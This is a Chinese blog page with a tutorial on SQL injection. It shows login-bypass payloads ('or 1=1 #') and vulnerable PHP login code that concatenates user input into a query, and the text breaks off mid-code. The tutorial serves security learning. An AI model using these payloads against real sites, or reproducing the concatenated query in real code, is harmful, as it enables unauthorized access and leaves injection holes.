<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>sql注入 | cgjil</title><meta name="author" content="cgjil"><meta name="copyright" content="cgjil"><meta name="referrer" content="no-referrer"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="sql注入"><meta name="application-name" content="sql注入"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="sql注入"><meta property="og:url" content="http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/index.html"><meta property="og:site_name" content="cgjil"><meta property="og:description" content="SQL注入1.SQL 注入原理1.1 万能用户名1.1.1  万能用户名777&amp;amp;#x27; or 1&amp;#x3D;1 # admin&amp;amp;#x27; or &amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1  1.1.2 查看代码&amp;lt;?php session_start ();header(&amp;amp;#x27;Content-"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="http://example.com/image/39.webp"><meta property="article:author" content="cgjil"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="http://example.com/image/39.webp"><meta name="description" content="SQL注入1.SQL 注入原理1.1 万能用户名1.1.1  万能用户名777&amp;amp;#x27; or 1&amp;#x3D;1 # admin&amp;amp;#x27; or &amp;amp;#x27;1&amp;amp;#x27;&amp;#x3D;&amp;amp;#x27;1  1.1.2 查看代码&amp;lt;?php session_start ();header(&amp;amp;#x27;Content-"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"><link rel="preconnect" href="//npm.elemecdn.com"/><link rel="preconnect" href="//npm.onmicrosoft.cn"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/@fortawesome/fontawesome-free@6.4.0/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.20/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  linkPageTop: undefined,
  peoplecanvas: undefined,
  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
  LA51: {"enable":true,"ck":"3G1uPFWikrp3ggY5","LingQueMonitorID":"3G1uPFWikrp3ggY5"},
  greetingBox: {"enable":true,"default":"晚上好👋","list":[{"greeting":"晚安😴","startTime":0,"endTime":5},{"greeting":"早上好鸭👋, 祝你一天好心情！","startTime":6,"endTime":9},{"greeting":"上午好👋, 状态很好，鼓励一下～","startTime":10,"endTime":10},{"greeting":"11点多啦, 在坚持一下就吃饭啦～","startTime":11,"endTime":11},{"greeting":"午安👋, 宝贝","startTime":12,"endTime":14},{"greeting":"🌈充实的一天辛苦啦！","startTime":14,"endTime":18},{"greeting":"19点喽, 奖励一顿丰盛的大餐吧🍔。","startTime":19,"endTime":19},{"greeting":"晚上好👋, 在属于自己的时间好好放松😌~","startTime":20,"endTime":24}]},
  twikooEnvId: '',
  commentBarrageConfig:undefined,
  root: '/',
  preloader: {"source":3},
  friends_vue_info: undefined,
  navMusic: true,
  mainTone: undefined,
  authorStatus: {"skills":["🏃 脚踏实地行动派"]},
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
  noticeOutdate: {"limitDay":365,"position":"top","messagePrev":"It has been","messageNext":"days since the last update, the content of the article may be outdated."},
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":330},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: true,
    simplehomepage: false,
    post: true
  },
  runtime: '天',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: cgjil","link":"链接: ","source":"来源: cgjil","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: true,
  isAnchor: false,
  shortcutKey: undefined,
  autoDarkmode: true
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  configTitle: 'cgjil',
  title: 'sql注入',
  postAI: '',
  pageFillDescription: 'SQL注入, 1.SQL 注入原理, 1.1 万能用户名, 1.1.1  万能用户名, 1.1.2 查看代码, 1.1.3  登录逻辑, 1.1.4  拼接问题, 1.2 SQL 注入总结, 1.2.1  SQL 注入原理, 1.2.2  SQL 注入危害, 1.2.3  SQL 注入分类, **1.3 SQL 注入漏洞挖掘, 1.3.1  注入点判断, 1.3.2  主要关注的问题, 1.3.3  CMS 注入点, 1.4 其他知识补充, 1.4.1  MySQL 数据库中的注释, 1.4.2  SQL 注入流程, 1.4.3  可以代替空格的字符, 2.SQL 注入基本手法, 2.1  联合查询, 2.1.1  必要条件, 2.1.2 目标分析, 2.1.3 判断列数, 2.1.4  判断显示位置, 2.2 报错注入, 2.2.1  , 2.2.2  extractvalue, 2.2.3  updatexml, 2.3 布尔盲注, 2.3.1  库名爆破, 2.3.2  库名长度, 2.3.3  按位测试, 2.4 延时注入, 2.4.1  数据库名字的长度, 2.4.2  数据库名字, 2.5 堆叠查询, 3.SQL 注入其他情况, 3.1 宽字节注入, 3.1.1  代码分析, 3.1.2  GBK 编码, 3.1.3 宽字节注入, 3.2 HTTP 头部注入, 3.2.1  Cookie 注入, 3.2.2  base64 注入, 3.2.3 User-Agent 注入, 3.2.4  Referer 注入, 4.SQL 注入读写文件, 4.1 前提条件, 4.1.1  权限问题, 4.1.2 文件路径, 4.1.3  安全选项, 4.2 读写文件, 4.2.1  读取文件, 4.2.2  写入文件, 5.SQL 注入工具, 5.1  SQLMap, 5.1.1  安装与更新, 5.1.2  参数速查, 5.1.3  参数速查, 5.1.4  POST 注入, 5.1.5  GetShell注入注入原理万能用户名万能用户名查看代码记住用户名用户名或密码不能为空用户名或密码不正确登录逻辑通过方式获取用户名和密码构造语句以用户名和密码作为查询条件进行查询并且是单引号闭合如果语句正确执行并且结果集对象中有记录则提示登录成功否则登录失败拼接问题用户名密码注入总结注入原理注入的攻击行为可以描述为通过用户可控参数中注入语法破坏原有结构达到编写程序时意料之外结果的攻击行为其成因可以归结为以下两个原因叠加造成的程序员在处理程序和数据库交互时使用字符串拼接的方式构造语句未对用户可控参数进行足够的过滤便将参数内容拼接到语句中注入危害攻击者可以利用注入漏洞可以获取数据库中的多种信息例如后台管理员账密从而脱取数据库中的内容脱库在特别的情况下还可以插入内容到数据库删除数据库中的内容或者修改数据库内容如果数据库权限分配存在问题或者数据库本身存在缺陷攻击者可以利用注入漏洞直接获取或者服务器权限注入分类两大基本类型五大基本手法提交参数方式注入点的位置注入漏洞挖掘注入点判断或是否能够回显上一个或者下一个页面判断是否有回显或是否显示数据库错误信息根据回显内容可以判断是字符型数据还是数字型回显的页面是否不同布尔类型的状态判断页面的返回时间判断转义主要关注的问题回显数据库中的内容是否会回显在网页中数据库报错数据库报错信息是否会回显在网页中提交的数据是字符型还是数字型如果是字符型数据闭合方式是什么布尔类型状态显示的页面不同形成对比页面正常或者不正常延时让数据库沉睡相应的秒数注入点是否有回显有回显是否有报错中间的单引号才是语句的内容没有出现在报错信息中说明是数字型注入有报错是否有布尔类型状态有布尔类型状态是否有延时有延时其他知识补充数据库中的注释减减空格三个字符井号内联注释注入流程库表列数据可以代替空格的字符注入基本手法联合查询必要条件两条语句查询结果具有相同列数对应的列数据类型相同特殊情况下条件被放松目标分析判断列数正常不正常当前语句中具有列判断显示位置把第一条语句的查询条件置为假数据库中敏感信息获取管理员账密数据库名表名列名数据报错注入在注入点的判断过程中发现数据库中语句的报错信息会显示在页面中因此可以利用报错信息进行注入报错注入的原理在错误信息中执行语句触发报错的方式有很多具体细节也不尽相同此处建议直接背公式将公式带换掉的部分布尔盲注页面中有布尔类型的状态可以根据布尔类型状态对数据库中的内容进行判断库名爆破不知道数据库名有多少位不知道数据库名的字符集合爆破成本很高库名长度页面正常说明数据库名字的长度是按位测试第一位第三位延时注入利用语句的延时性以时间线作为判断条件数据库名字的长度页面有延时数据库名字堆叠查询一次请求可以同时执行多条语句包括增删改查操作以第关为例子注入其他情况宽字节注入宽字节注入准确来说不是注入手法而是另外一种比较特殊的情况宽字节注入的目的是绕过单双引号转义以关为例子服务器会把单引号转义单引号由原来的定义字符串的特殊字符被转义为普通字符非常强烈的暗示代码分析单双引号被转义没有其他过滤将与数据库交互的数据字符编码设置为了编码汉字编码方案双字节编码两个字节作为一个汉字编码范围可以通过汉字字符集编码查询注意到在编码的低位范围之内在之前添加一个字符之间该字符就会和组成一个汉字宽字节注入薥薥吃掉了转义字符头部注入注入点不止会出现在参数或参数中注入注入点在数据中以关为例子注入注入的参数需要进行编码以关为例子注入注入的参数在中以关为例子注入注入参数在字段中以关为例子注入读写文件前提条件权限问题当前连接数据库的用户具有文件读写权限数据库的权限粒度某个库中某个表某个用户是否有增删改查权限数据库用户例如由两部分组成用户名地址文件路径已知读写目标文件的绝对路径安全选项数据库有关于文件读写的安全选项参数限制了的导入导出操作这个选项是不能利用语句修改必须修改配置文件并重启数据库参数值参数含义限制不允许导入导出操作会限制的导入导出操作在某个固定目录下并且子目录有效不对的导入导出操作做限制读写文件读取文件使用函数写入文件使用语句系统下一般情况下权限较低无法写入文件注入工具安装与更新源码包安装参数速查参数含义检测注入点列出所有的库名当前连接数据库用户的名字当前数据库的名字指定目标数据库为列出数据库中所有的表名指定目标表名为列出所有的字段名指定目标字段列出字段内容从文件中读取请求在特定情况下可以直接获得目标系统设置检测等级携带信息进行注入利用搜索引擎自动搜索注入点使用默认选项使用随机信息显示参数速查注入点注入受到选项的限制目标系统根目录的绝对路径目录权限',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-05 20:44:03',
  postMainColor: '',
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
        }
      }
      const t = saveToLocal.get('theme')
    
          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

          if (t === undefined) {
            if (isLightMode) activateLightMode()
            else if (isDarkMode) activateDarkMode()
            else if (isNotSpecified || hasNoSupport) {
              const now = new Date()
              const hour = now.getHours()
              const isNight = hour <= 6 || hour >= 18
              isNight ? activateDarkMode() : activateLightMode()
            }
            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
              if (saveToLocal.get('theme') === undefined) {
                e.matches ? activateDarkMode() : activateLightMode()
              }
            })
          } else if (t === 'light') activateLightMode()
          else activateDarkMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://hbimg.huaban.com/535ad5a8d0a1762fc1cbe65f6e7748d373a8c57d7bfa-l5D3wU_fw658"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
  endLoading: () => {
    document.getElementById('loading-box').classList.add("loaded");
  },
  initLoading: () => {
    document.getElementById('loading-box').classList.remove("loaded")
  }
}
window.addEventListener('load',()=> { preloader.endLoading() })
setTimeout(function(){preloader.endLoading();},10000)

if (true) {
  document.addEventListener('pjax:send', () => { preloader.initLoading() })
  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="not-top-img" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">cgjil</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button only-home" id="travellings_button" title="随机前往一个开往项目网站"><a class="site-page" onclick="anzhiyu.totraveling()" title="随机前往一个开往项目网站" href="javascript:void(0);" rel="external nofollow" data-pjax-state="external"><i class="anzhiyufont anzhiyu-icon-train"></i></a></div><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><div class="nav-button" id="search-button"><a class="site-page social-icon search" href="javascript:void(0);" title="搜索🔍" accesskey="s"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span> 搜索</span></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/Linux/" style="font-size: 1.05rem;">Linux<sup>3</sup></a><a href="/tags/Windows/" style="font-size: 1.05rem;">Windows<sup>4</sup></a><a href="/tags/vulhub/" style="font-size: 1.05rem;">vulhub<sup>2</sup></a><a href="/tags/%E8%84%9A%E6%9C%AC/" style="font-size: 1.05rem;">脚本<sup>1</sup></a><a href="/tags/%E8%AF%AD%E8%A8%80/" style="font-size: 1.05rem;">语言<sup>6</sup></a></div></div><hr/></div></div><div class="console-card history"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-box-archiv"></i><span>文章</span></div><div class="card-archives"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-archive"></i><span>归档</span></div><ul class="card-archive-list"><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/12/"><span class="card-archive-list-date">十二月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">6</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/11/"><span class="card-archive-list-date">十一月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">12</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/10/"><span class="card-archive-list-date">十月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">5</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/09/"><span class="card-archive-list-date">九月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/08/"><span class="card-archive-list-date">八月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/07/"><span class="card-archive-list-date">七月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">1</span><span>篇</span></div></a></li><li class="card-archive-list-item"><a class="card-archive-list-link" href="/archives/2022/06/"><span class="card-archive-list-date">六月 2022</span><div class="card-archive-list-count-group"><span class="card-archive-list-count">3</span><span>篇</span></div></a></li></ul></div><hr/></div></div></div><div class="button-group"><div class="console-btn-item"><a class="darkmode_switchbutton" title="显示模式切换" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-moon"></i></a></div><div class="console-btn-item" id="consoleHideAside" onclick="anzhiyu.hideAsideBtn()" title="边栏显示控制"><a class="asideSwitch"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></a></div><div class="console-btn-item on" id="consoleCommentBarrage" onclick="anzhiyu.switchCommentBarrage()" title="热评开关"><a class="commentBarrage"><i class="anzhiyufont anzhiyu-icon-message"></i></a></div><div class="console-btn-item" id="consoleMusic" onclick="anzhiyu.musicToggle()" title="音乐开关"><a class="music-switch"><i class="anzhiyufont anzhiyu-icon-music"></i></a></div></div><div class="console-mask" onclick="anzhiyu.hideConsole()" href="javascript:void(0);"></div></div><div class="nav-button" id="nav-totop"><a class="totopbtn" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i><span id="percent" onclick="anzhiyu.scrollToDest(0,500)">0</span></a></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);" title="切换"><i class="anzhiyufont anzhiyu-icon-bars"></i></a></div></div></div></nav></header><main id="blog-container"><div class="layout" id="content-inner"><div id="post"><div id="post-info"><div id="post-firstinfo"><div class="meta-firstline"><a class="post-meta-original">原创</a><span class="post-meta-categories"><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-inbox post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url">漏洞</a></span><span class="article-meta tags"></span></div></div><h1 class="post-title" itemprop="name headline">sql注入</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="anzhiyufont anzhiyu-icon-calendar-days post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" itemprop="dateCreated datePublished" datetime="2022-11-05T12:44:03.000Z" title="发表于 2022-11-05 20:44:03">2022-11-05</time><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-history post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" itemprop="dateCreated datePublished" datetime="2022-11-05T12:44:03.000Z" title="更新于 2022-11-05 20:44:03">2022-11-05</time></span></div><div class="meta-secondline"><span class="post-meta-separator"></span><span class="post-meta-wordcount"><i class="anzhiyufont anzhiyu-icon-file-word post-meta-icon" title="文章字数"></i><span class="post-meta-label" title="文章字数">字数总计:</span><span class="word-count" title="文章字数">4.1k</span><span class="post-meta-separator"></span><i class="anzhiyufont anzhiyu-icon-clock post-meta-icon" title="阅读时长"></i><span class="post-meta-label" title="阅读时长">阅读时长:</span><span>18分钟</span></span><span class="post-meta-separator"></span><span id="" data-flag-title="sql注入"><i class="anzhiyufont anzhiyu-icon-fw-eye post-meta-icon"></i><span class="post-meta-label" title="阅读量">阅读量:</span><span class="waline-pageview-count" data-path="/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/" title="访问量"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></span><span class="post-meta-separator"></span><span class="post-meta-commentcount"><i class="anzhiyufont anzhiyu-icon-comments post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/#post-comment"><span class="waline-comment-count" data-path="/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-spin"></i></span></a></span></div></div></div><article class="post-content" id="article-container" itemscope itemtype="http://example.com/2022/11/05/%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"><header><a class="post-meta-categories" href="/categories/%E6%BC%8F%E6%B4%9E/" itemprop="url">漏洞</a><h1 id="CrawlerTitle" itemprop="name headline">sql注入</h1><span itemprop="author" itemscope itemtype="http://schema.org/Person">cgjil</span><time itemprop="dateCreated datePublished" datetime="2022-11-05T12:44:03.000Z" title="发表于 2022-11-05 20:44:03">2022-11-05</time><time itemprop="dateCreated datePublished" datetime="2022-11-05T12:44:03.000Z" title="更新于 2022-11-05 20:44:03">2022-11-05</time></header><h1 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h1><h2 id="1-SQL-注入原理"><a href="#1-SQL-注入原理" class="headerlink" title="1.SQL 注入原理"></a>1.<strong>SQL</strong> 注入原理</h2><h3 id="1-1-万能用户名"><a href="#1-1-万能用户名" class="headerlink" title="1.1 万能用户名"></a><strong>1.1</strong> 万能用户名</h3><h4 id="1-1-1-万能用户名"><a href="#1-1-1-万能用户名" class="headerlink" title="1.1.1  万能用户名"></a><strong>1.1.1</strong>  <strong>万能用户名</strong></h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">777<span class="string">&#x27; or 1=1 # </span></span><br><span class="line"><span class="string">admin&#x27;</span> or <span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>

<h4 id="1-1-2-查看代码"><a href="#1-1-2-查看代码" class="headerlink" title="1.1.2 查看代码"></a>1.1.2 查看代码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">session_start</span> ();</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); <span class="keyword">include_once</span> (<span class="string">&quot;../include/config.inc.php&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ( <span class="variable">$_POST</span> [<span class="string">&quot;username&quot;</span>] )) &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span> [<span class="string">&quot;username&quot;</span>]; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span> ( <span class="variable">$_POST</span> [<span class="string">&quot;password&quot;</span>] )) &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span> [<span class="string">&quot;password&quot;</span>]; &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;&quot;</span>; &#125;</span><br><span class="line"><span class="comment">//记住用户名</span></span><br><span class="line"><span class="title function_ invoke__">setcookie</span> (username, <span class="variable">$username</span>,<span class="title function_ invoke__">time</span>()+<span class="number">3600</span>*<span class="number">24</span>*<span class="number">365</span>); <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$username</span>)||<span class="keyword">empty</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;用户名或密码不能为空！&#x27;);window.history.go(-1)&lt;/script&gt;&quot;</span>); &#125;</span><br><span class="line"><span class="variable">$user_row</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getOneRow</span>(<span class="string">&quot;select userid from cms_users where username = &#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; and password=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span> (</span><br><span class="line"><span class="variable">$password</span> ) .<span class="string">&quot;&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$user_row</span> )) &#123;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span> (userid, <span class="variable">$user_row</span> [<span class="string">&#x27;userid&#x27;</span>] ); <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span 